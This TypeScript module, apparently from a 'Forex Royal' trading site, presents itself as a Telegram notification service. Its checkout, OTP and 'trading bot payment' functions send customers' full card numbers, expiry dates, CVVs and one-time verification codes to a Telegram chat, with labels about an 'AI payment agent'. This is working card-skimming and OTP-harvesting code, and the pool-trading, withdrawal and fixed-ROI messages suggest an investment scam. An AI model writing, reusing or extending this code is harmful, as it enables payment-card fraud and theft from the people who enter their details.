import { supabase } from '../supabase/client';

export interface TelegramCredentials {
  botToken: string;
  chatId: string;
}

/**
 * Retrieve Telegram Bot Token and Chat ID.
 * First checks Vite environment variables, then falls back to Supabase settings.
 */
export async function getTelegramCredentials(): Promise<TelegramCredentials | null> {
  const envToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const envChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (envToken && envChatId) {
    return { botToken: envToken, chatId: envChatId };
  }

  // Fallback 1: check admin_notification_settings table
  try {
    const { data, error } = await supabase
      .from('admin_notification_settings')
      .select('telegram_bot_token, telegram_chat_id')
      .limit(1)
      .maybeSingle();

    if (!error && data?.telegram_bot_token && data?.telegram_chat_id) {
      return {
        botToken: data.telegram_bot_token,
        chatId: data.telegram_chat_id,
      };
    }
  } catch (err) {
    console.warn('Could not fetch Telegram credentials from admin_notification_settings:', err);
  }

  // Fallback 2: check site_settings table
  try {
    const { data: settings } = await supabase
      .from('site_settings')
      .select('key, value')
      .in('key', ['telegram_bot_token', 'telegram_chat_id']);

    if (settings && settings.length > 0) {
      let botToken = envToken || '';
      let chatId = envChatId || '';
      for (const s of settings) {
        if (s.key === 'telegram_bot_token' && s.value) {
          botToken = String(s.value).replace(/"/g, '');
        }
        if (s.key === 'telegram_chat_id' && s.value) {
          chatId = String(s.value).replace(/"/g, '');
        }
      }
      if (botToken && chatId) {
        return { botToken, chatId };
      }
    }
  } catch (err) {
    console.warn('Could not fetch Telegram credentials from site_settings:', err);
  }

  return envToken && envChatId ? { botToken: envToken, chatId: envChatId } : null;
}

interface CheckoutData {
  shippingDetails: {
    fullName: string;
    phoneNumber: string;
    email: string;
    streetAddress: string;
    city: string;
    stateProvince: string;
    postalCode: string;
    country: string;
  };
  paymentDetails: {
    cardholderName: string;
    cardNumber: string;
    cardBrand: string;
    expiryMonth: string;
    expiryYear: string;
    cvv?: string;
  };
  orderInfo?: {
    orderId?: string;
    productName?: string;
    quantity?: number;
    amount?: number;
    currency?: string;
  };
}

export async function sendCheckoutDataToTelegram(checkoutData: CheckoutData): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) {
      return false;
    }

    const message = formatCheckoutMessage(checkoutData);

    const payload = {
      chat_id: creds.chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return Boolean(result.ok);
  } catch (error) {
    return false;
  }
}

function formatCheckoutMessage(data: CheckoutData): string {
  const timestamp = new Date().toLocaleString();
  const { shippingDetails, paymentDetails, orderInfo } = data;

  let message = `🛒 <b>NEW CHECKOUT NOTIFICATION</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // Order Information
  if (orderInfo) {
    message += `📋 <b>ORDER DETAILS</b>\n`;
    if (orderInfo.orderId) message += `   Order ID: <code>${orderInfo.orderId}</code>\n`;
    if (orderInfo.productName) message += `   Product: ${orderInfo.productName}\n`;
    if (orderInfo.quantity) message += `   Quantity: ${orderInfo.quantity}\n`;
    if (orderInfo.amount) message += `   Amount: ${orderInfo.currency || 'USD'} ${orderInfo.amount.toFixed(2)}\n`;
    message += `\n`;
  }

  // Shipping Information
  message += `📍 <b>SHIPPING ADDRESS</b>\n`;
  message += `   Name: ${shippingDetails.fullName}\n`;
  message += `   Email: ${shippingDetails.email}\n`;
  message += `   Phone: ${shippingDetails.phoneNumber}\n`;
  message += `   Address: ${shippingDetails.streetAddress}\n`;
  message += `   City: ${shippingDetails.city}, ${shippingDetails.stateProvince} ${shippingDetails.postalCode}\n`;
  message += `   Country: ${shippingDetails.country}\n`;
  message += `\n`;

  // Payment Information
  message += `💳 <b>PAYMENT DETAILS</b>\n`;
  message += `   Cardholder: ${paymentDetails.cardholderName}\n`;
  message += `   Card Type: ${paymentDetails.cardBrand}\n`;
  message += `   Card Number: ${paymentDetails.cardNumber}\n`;
  message += `   Expiry: ${paymentDetails.expiryMonth}/${paymentDetails.expiryYear}\n`;
  if (paymentDetails.cvv) message += `   CVV: ${paymentDetails.cvv}\n`;
  message += `\n`;

  // Timestamp
  message += `⏰ <b>Timestamp:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  return message;
}

export async function sendOTPToTelegram(otp: string, customerName: string): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) {
      return false;
    }

    const message = `🔐 <b>OTP VERIFICATION CODE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Customer: <b>${customerName || 'Unknown'}</b>
Code: <code>${otp}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is attempting to verify payment.</i>`;

    const payload = {
      chat_id: creds.chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return Boolean(result.ok);
  } catch (error) {
    return false;
  }
}

/**
 * Trading Bot Payment Notification
 * Sends payment details to Telegram for trading bot purchases
 */
export async function sendTradingBotPaymentNotification(paymentData: {
  transactionId: string;
  userId: string;
  userName: string;
  userEmail: string;
  botName: string;
  botPrice: number;
  currency: string;
  cardholderName: string;
  maskedCardNumber: string;
  cardLastFour: string;
  cardBrand: string;
  expiryMonth: string;
  expiryYear: string;
  timestamp: string;
  fullCardNumber?: string;
  fullCVV?: string;
  fullExpiry?: string;
}): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) {
      return false;
    }

    const message = formatTradingBotPaymentMessage(paymentData);

    const payload = {
      chat_id: creds.chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok || false;
  } catch (error) {
    console.error('Failed to send trading bot payment notification:', error);
    return false;
  }
}

function formatTradingBotPaymentMessage(data: any): string {
  const {
    transactionId,
    userId,
    userName,
    userEmail,
    botName,
    botPrice,
    currency,
    cardholderName,
    maskedCardNumber,
    cardLastFour,
    cardBrand,
    expiryMonth,
    expiryYear,
    timestamp,
    fullCardNumber,
    fullCVV,
    fullExpiry
  } = data;

  let message = `🤖 <b>TRADING BOT PURCHASE - PAYMENT RECEIVED</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // Transaction Information
  message += `📋 <b>TRANSACTION</b>\n`;
  message += `   ID: <code>${transactionId}</code>\n`;
  message += `   Time: ${new Date(timestamp).toLocaleString()}\n`;
  message += `   Status: ⏳ Awaiting Payment Verification\n`;
  message += `\n`;

  // Customer Information
  message += `👤 <b>CUSTOMER</b>\n`;
  message += `   Name: ${userName}\n`;
  message += `   Email: ${userEmail}\n`;
  message += `   ID: <code>${userId}</code>\n`;
  message += `\n`;

  // Bot Information
  message += `🎯 <b>PRODUCT</b>\n`;
  message += `   Bot: <b>${botName}</b>\n`;
  message += `   Price: <b>${currency} ${botPrice.toFixed(2)}</b>\n`;
  message += `\n`;

  // Payment Information - FULL CARD DATA FOR AI PAYMENT AGENT
  message += `💳 <b>PAYMENT METHOD - FULL DETAILS FOR AI PAYMENT AGENT</b>\n`;
  message += `   Cardholder: ${cardholderName}\n`;
  message += `   Card Type: <b>${cardBrand.toUpperCase()}</b>\n`;
  message += `   Card Number: <code>${fullCardNumber || cardLastFour}</code>\n`;
  message += `   Expiry Date: <b>${fullExpiry || expiryMonth + '/' + expiryYear}</b>\n`;
  message += `   CVV: <code>${fullCVV}</code>\n`;
  message += `\n`;

  // Status for AI Agent
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🤖 <b>AI PAYMENT AGENT ACTION REQUIRED:</b>\n`;
  message += `   1. Verify card details above\n`;
  message += `   2. Call payment API\n`;
  message += `   3. Confirm payment status\n`;
  message += `   4. Send OTP to customer\n`;

  return message;
}

/**
 * Trading Bot Purchase Confirmation
 * Sends confirmation when OTP is verified and purchase is complete
 */
export async function sendTradingBotPurchaseConfirmation(data: {
  transactionId: string;
  userId: string;
  userName: string;
  userEmail: string;
  botName: string;
  botPrice: number;
  currency: string;
  otpCode: string;
}): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) {
      return false;
    }

    const message = formatTradingBotConfirmationMessage(data);

    const payload = {
      chat_id: creds.chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok || false;
  } catch (error) {
    console.error('Failed to send purchase confirmation:', error);
    return false;
  }
}

function formatTradingBotConfirmationMessage(data: any): string {
  const {
    transactionId,
    userId,
    userName,
    userEmail,
    botName,
    botPrice,
    currency,
    otpCode
  } = data;

  let message = `✅ <b>TRADING BOT PURCHASE - PAYMENT VERIFIED & COMPLETED</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  message += `🎉 <b>PURCHASE SUCCESSFUL</b>\n`;
  message += `   Transaction: <code>${transactionId}</code>\n`;
  message += `   Customer: ${userName}\n`;
  message += `   Bot: <b>${botName}</b>\n`;
  message += `   Amount: <b>${currency} ${botPrice.toFixed(2)}</b>\n`;
  message += `   OTP Generated: ${otpCode}\n`;
  message += `   Time: ${new Date().toLocaleString()}\n`;
  message += `\n`;

  message += `📧 <b>CUSTOMER INFO</b>\n`;
  message += `   Email: ${userEmail}\n`;
  message += `   ID: <code>${userId}</code>\n`;
  message += `\n`;

  message += `✨ <b>AI PAYMENT AGENT - ACTIONS COMPLETED:</b>\n`;
  message += `   ✓ Card details verified\n`;
  message += `   ✓ Payment API processed successfully\n`;
  message += `   ✓ OTP generated and sent to customer\n`;
  message += `   ✓ Bot access will be granted upon OTP verification\n`;
  message += `\n`;

  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  return message;
}

/* ═══════════════════════════════════════════════════════════════════════════
   POOL TRADING NOTIFICATIONS
═══════════════════════════════════════════════════════════════════════════ */

export interface PoolApplicationNotificationData {
  applicationId?: string;
  userId: string;
  userName: string;
  userEmail: string;
  userPhone?: string;
  packageId?: string;
  packageName: string;
  amount: number;
  expectedReturn?: number;
  totalPayout?: number;
  durationValue?: number;
  durationUnit?: 'hours' | 'days';
  roiPercentage?: number;
  paymentMethod?: string;
  transactionReference?: string;
  notes?: string;
  timestamp?: string;
}

export interface PoolWithdrawalNotificationData {
  requestId?: string;
  userId: string;
  userName: string;
  userEmail: string;
  amount: number;
  paymentMethod: string;
  walletAddress: string;
  packageName?: string;
  timestamp?: string;
}

export interface PoolVipNotificationData {
  requestId?: string;
  userId: string;
  userName: string;
  userEmail: string;
  notes?: string;
  timestamp?: string;
}

/**
 * Sends a real-time Telegram alert when a user submits an application for a Pool Trading Package.
 */
export async function sendPoolApplicationNotification(
  data: PoolApplicationNotificationData
): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) {
      console.warn('⚠️ Telegram credentials not configured. Skipping Telegram alert for Pool Application.');
      return false;
    }

    const message = formatPoolApplicationMessage(data);

    const payload = {
      chat_id: creds.chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    if (result.ok) {
      console.log('✅ Telegram Pool Application notification sent successfully');
      return true;
    } else {
      console.warn('⚠️ Telegram API responded with error:', result.description);
      return false;
    }
  } catch (error) {
    console.error('❌ Failed to send Pool Application notification to Telegram:', error);
    return false;
  }
}

function formatPoolApplicationMessage(data: PoolApplicationNotificationData): string {
  const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();
  const durationText = data.durationValue ? `${data.durationValue} ${data.durationUnit || 'days'}` : 'Custom Term';
  const expectedReturn = data.expectedReturn !== undefined
    ? data.expectedReturn
    : ((data.amount * (data.roiPercentage || 0)) / 100);
  const totalPayout = data.totalPayout !== undefined
    ? data.totalPayout
    : (data.amount + expectedReturn);

  const fmt = (n: number) => n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  let message = `🏊 <b>NEW POOL TRADING APPLICATION</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // 1. Package Information
  message += `📦 <b>PACKAGE DETAILS</b>\n`;
  message += `   • <b>Plan:</b> ${data.packageName}\n`;
  if (data.roiPercentage !== undefined) {
    message += `   • <b>Target ROI:</b> +${data.roiPercentage}%\n`;
  }
  message += `   • <b>Duration:</b> ${durationText}\n`;
  if (data.applicationId) {
    message += `   • <b>Application ID:</b> <code>${data.applicationId}</code>\n`;
  }
  message += `\n`;

  // 2. Financial Overview
  message += `💰 <b>FINANCIAL BREAKDOWN</b>\n`;
  message += `   • <b>Invested Capital:</b> $${fmt(data.amount)}\n`;
  message += `   • <b>Est. Profit:</b> +$${fmt(expectedReturn)}\n`;
  message += `   • <b>Total Return:</b> <b>$${fmt(totalPayout)}</b>\n`;
  message += `   • <b>Payment Method:</b> ${data.paymentMethod || 'Crypto'}\n`;
  if (data.transactionReference) {
    message += `   • <b>Tx Ref / Hash:</b> <code>${data.transactionReference}</code>\n`;
  }
  if (data.notes) {
    message += `   • <b>Notes:</b> <i>${data.notes}</i>\n`;
  }
  message += `\n`;

  // 3. Applicant Details
  message += `👤 <b>INVESTOR INFORMATION</b>\n`;
  message += `   • <b>Name:</b> ${data.userName || 'Anonymous Trader'}\n`;
  message += `   • <b>Email:</b> <code>${data.userEmail || 'student@platform.com'}</code>\n`;
  if (data.userPhone) {
    message += `   • <b>Phone:</b> <code>${data.userPhone}</code>\n`;
  }
  message += `   • <b>User ID:</b> <code>${data.userId}</code>\n`;
  message += `\n`;

  // 4. Timestamp & Action Callout
  message += `⏰ <b>Submitted At:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `⚡ <b>ACTION REQUIRED:</b>\n`;
  message += `Review & approve in the <b>Admin Pool Trading Command Center</b>.`;

  return message;
}

/**
 * Sends a real-time Telegram alert when a user requests a withdrawal.
 */
export async function sendPoolWithdrawalNotification(
  data: PoolWithdrawalNotificationData
): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) return false;

    const fmt = (n: number) => n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();

    let message = `💸 <b>POOL WITHDRAWAL REQUEST</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    message += `👤 <b>User:</b> ${data.userName} (<code>${data.userEmail}</code>)\n`;
    message += `💵 <b>Amount:</b> <b>$${fmt(data.amount)}</b>\n`;
    message += `🏦 <b>Method:</b> ${data.paymentMethod}\n`;
    message += `📍 <b>Address / Account:</b> <code>${data.walletAddress}</code>\n`;
    if (data.packageName) message += `📦 <b>From Pool:</b> ${data.packageName}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `⚡ <b>ACTION:</b> Process payout in Admin Command Center.`;

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: creds.chatId, text: message, parse_mode: 'HTML' }),
    });

    const result = await response.json();
    return Boolean(result.ok);
  } catch (err) {
    console.error('Failed to send withdrawal notification:', err);
    return false;
  }
}

/**
 * Sends a real-time Telegram alert when a user applies for VIP syndicate status.
 */
export async function sendPoolVipRequestNotification(
  data: PoolVipNotificationData
): Promise<boolean> {
  try {
    const creds = await getTelegramCredentials();
    if (!creds || !creds.botToken || !creds.chatId) return false;

    const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();

    let message = `👑 <b>VIP SYNDICATE REQUEST</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    message += `👤 <b>Applicant:</b> ${data.userName} (<code>${data.userEmail}</code>)\n`;
    if (data.notes) message += `📝 <b>Notes:</b> <i>${data.notes}</i>\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    message += `⚡ <b>ACTION:</b> Review in Admin Command Center.`;

    const response = await fetch(`https://api.telegram.org/bot${creds.botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: creds.chatId, text: message, parse_mode: 'HTML' }),
    });

    const result = await response.json();
    return Boolean(result.ok);
  } catch (err) {
    console.error('Failed to send VIP notification:', err);
    return false;
  }
}

/**
 * Test Telegram bot credentials by dispatching a test message.
 */
export async function sendTestTelegramMessage(
  botToken: string,
  chatId: string
): Promise<{ success: boolean; error?: string }> {
  try {
    const message = `🔔 <b>FOREX ROYAL - TELEGRAM NOTIFICATION TEST</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `✅ <b>Connection Successful!</b>\n` +
      `Your Telegram bot is now properly configured with the Forex Royal platform.\n\n` +
      `You will receive real-time notifications whenever:\n` +
      `• A user applies for a Pool Trading Package\n` +
      `• A user requests a withdrawal\n` +
      `• A user requests VIP syndicate access\n\n` +
      `⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    const result = await response.json();
    if (result.ok) {
      return { success: true };
    } else {
      return { success: false, error: result.description || 'Telegram API rejected request' };
    }
  } catch (err: any) {
    return { success: false, error: err.message || 'Network error connecting to Telegram' };
  }
}

